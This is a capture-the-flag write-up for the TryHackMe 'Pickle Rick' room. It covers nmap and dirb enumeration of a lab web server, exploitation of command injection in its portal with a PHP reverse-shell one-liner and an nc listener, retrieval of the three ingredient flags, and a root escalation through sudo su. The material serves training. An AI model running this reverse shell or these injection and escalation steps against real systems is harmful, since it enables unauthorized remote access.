# Room Information

Room link: https://tryhackme.com/room/picklerick

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/26/2023

# Scanning and Enumeration
> Port Scanning Using Nmap 
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (**-sC**) and version detection (**-sV**) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.29.218 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 21:47 EDT
Nmap scan report for 10.10.29.218
Host is up (0.090s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 425ce2141719498f93765ab4df3162d2 (RSA)
|   256 c8c548584647f7b948b286c84d99e653 (ECDSA)
|_  256 88354fcc3adc12ae0e1e7e536be3fbb2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
```

##
> Scanning for Hiddend Web Directory Using Dirb
4. `dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt`
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.29.218 /usr/share/dirb/wordlists/extensions_common.txt -r   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jun 26 23:35:06 2023
URL_BASE: http://10.10.29.218/
WORDLIST_FILES: /usr/share/dirb/wordlists/extensions_common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 28                                                            

---- Scanning URL: http://10.10.29.218/ ----
+ http://10.10.29.218/.php (CODE:403|SIZE:291)   
+ http://10.10.29.218/.phtml (CODE:403|SIZE:293)   
+ http://10.10.29.218// (CODE:200|SIZE:1062)                                                   
                                                                               
-----------------
END_TIME: Mon Jun 26 23:35:09 2023
DOWNLOADED: 28 - FOUND: 3
```
5. `vim {FILENAME2}.txt`
```bash
┌──(kali㉿kali)-[~]
└─$ vim Extensions.txt
```
![]()
6. `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt` to non-recursively scan the target URL using the custom extensions wordlist we created for files and directories using Dirb's default wordlist and then redirecting the results into a text file
7. `cat {FILENAME3}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.29.218 -x ~/Extensions.txt -r > WebDirectoryScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.29.218 -x ~/Extensions.txt -r 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jun 26 23:39:06 2023
URL_BASE: http://10.10.29.218/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive
EXTENSIONS_FILE: /home/kali/Extensions.txt | (.php)(.phtml) [NUM = 2]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.29.218/ ----
+ http://10.10.29.218/denied.php (CODE:302|SIZE:0)   
+ http://10.10.29.218/login.php (CODE:200|SIZE:882)     
+ http://10.10.29.218/portal.php (CODE:302|SIZE:0)                                                                                                                 
-----------------
END_TIME: Mon Jun 26 23:53:16 2023
DOWNLOADED: 9224 - FOUND: 3
```

##
> Reading the robots.txt File
8. `firefox http://{TARGET IP}/robots.txt`
![]()

##
> Inspecting the Home Page
9. `firefox http://{TARGET IP}`
![]()

##
> Logging In
10. `firefox "http://{TARGET IP}/login.php"`
![]()


# Vulnerability Identification
> Command Injection
11. `sudo -l`
12. `php --version`
![]()
13. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"`
![]()

# Vulnerability Exploitation
> Reverse Shell
14. `nc -lnvp {PORT NUMBER}`
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
```
15. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");'`
![]()
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.6.54.63] from (UNKNOWN) [10.10.29.218] 53980
/bin/sh: 0: can't access tty; job control turned off
$ 
```
16. `ls`
17. `cat {SECRET INGREDIENT FILE1}.txt`
```bash
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php          
robots.txt
```
```bash       
$ cat Sup3rS3cretPickl3Ingred.txt               
mr. meeseek hair                                                                               
```
18. `pwd`
```bash
$ pwd
/var/www/html
```
19. `cd /home`
20. `ls`
```bash
$ cd /home
```
```bash
$ ls
rick
ubuntu
```
21. `cd rick`
22. `ls`
23. `cat '{SECRET INGREDIENT FILE2}.txt'`
```bash
$ cd rick
```
```bash
$ ls
second ingredients
```
```bash
$ cat 'second ingredients'
1 jerry tear
```

# Post Exploitation
> Privilege Exploitation
24. `sudo su`
25. `whoami`
26. `cd /root`
27. `ls`
28. `cat {SECRET INGREDIENT FILE3}.txt`
```bash
$ sudo su
```
```bash
whoami
root
```
```bash
cd /root
```
```bash
ls
3rd.txt
snap
```
```bash
cat 3rd.txt
fleeb juice
```


**Room complete!**
![]()

# Command History

# Dissecting Comands

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/
